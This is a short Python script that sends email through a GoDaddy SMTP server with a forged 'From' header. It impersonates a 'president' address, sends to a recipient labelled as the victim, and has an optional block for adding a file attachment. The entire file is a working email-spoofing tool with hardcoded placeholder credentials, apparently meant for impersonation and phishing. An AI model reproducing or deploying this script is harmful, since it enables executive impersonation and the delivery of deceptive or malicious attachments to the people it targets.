from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
from email.mime.base import MIMEBase
from email import encoders

### Main configs

# Email credentials
username = "myrealemail@mail.site"  
password = "P4ssw0rd"

fake_from = "president@anydomain.com"      # Spoof mail
to_email = "victims@company.com"      # Target email
# Content
subject = "SpoofTest"
body = "Testing"


## Text content
msg = MIMEMultipart()
msg['Subject'] = subject 
msg['From'] = fake_from
msg['To'] = to_email
msg.attach(MIMEText(body))

## Attachment content
#### Comment this if no attachment #########

#file = "../test.png"                   # Filepath to attach
#part = MIMEBase('application', "octet-stream")
#part.set_payload(open(file, "rb").read())
#encoders.encode_base64(part)    
#part.add_header('Content-Disposition', 'attachment; filename=%s' % file)
#msg.attach(part)

############################################

## Godaddy server, change it for another mail server
server = smtplib.SMTP_SSL("smtpout.secureserver.net", 465)
server.login(username, password)
server.sendmail(username, to_email, msg.as_string())
server.close()